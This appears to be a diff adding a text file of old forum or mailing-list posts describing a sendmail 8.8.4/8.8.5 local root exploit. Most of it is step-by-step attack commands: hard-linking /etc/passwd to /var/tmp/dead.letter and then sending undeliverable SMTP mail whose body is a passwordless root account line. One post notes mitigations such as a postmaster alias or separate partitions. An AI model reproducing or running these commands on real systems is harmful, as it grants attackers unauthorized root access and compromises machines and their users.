@@ -1,0 +1,60 @@
+
+
+Try this:
+Make hard link of /etc/passwd to /var/tmp/dead.letter
+Telnet to port 25, send mail from some bad email address to some unreacheable hoost.
+Watch your message get appended to passwd.
+ie:
+cowzilla::0:0:c0wz1ll4 0wns u:/:/bin/sh
+
+This is not good.  Worked with my 8.8.4, will probably also work with 8.8.5
+
+Root for the whole family
+
+==================================================================
+
+okay, just want to point out some things about this exploit...
+this won't work on big boxes that are partitioned cause you can only do a
+hard link on the same file system.  another point is that any box that has
+a 'MAILER-DAEMON' defined will get any mail that gets sent there instead of it
+saving it to /var/tmp/dead.letter, ie, make an /etc/aliases file that defines
+a MAILER-DAEMON. for instance, i add these two to my /etc/aliases:
+
+MAILER-DAEMON:gonzo
+postmaster:gonzo
+
+then you just type 'newaliases' and you're good to go. (postmaster is a
+general good idea) course then you have to deal with ppl's messed up mail...
+
+
+===================================================================
+
+Here's a nice little sendmail exploit that works with 8.8.4 and maybe with
+8.8.5.
+You need to have an account on the system you're exploiting.
+telnet to your shell and issue following commands:
+
+ln /etc/passwd /var/tmp/dead.letter
+telnet target.host 25
+mail from: non@existent.host
+rcpt to: non@existent.host
+data
+kRad::0:0:J0oR dEaD:/root:/bin/bash
+.
+quit
+
+The body of the message will be written into /etc/passwd and you've got a
+password-free root account.
+
+Note that this will NOT work under any of the following circumstances:
+
+1. /var and / are different partitions.
+	You can't make a hardlink between different partitions.
+2. There is a postmaster account or mail alias.
+	Mail problems are sent to postmaster before they go to
+	/var/tmp/dead.letter.	
+3. /var/tmp doesn't exist or isn't publicly writable.
+	Duh.
+4. Other situations?
+
+ 
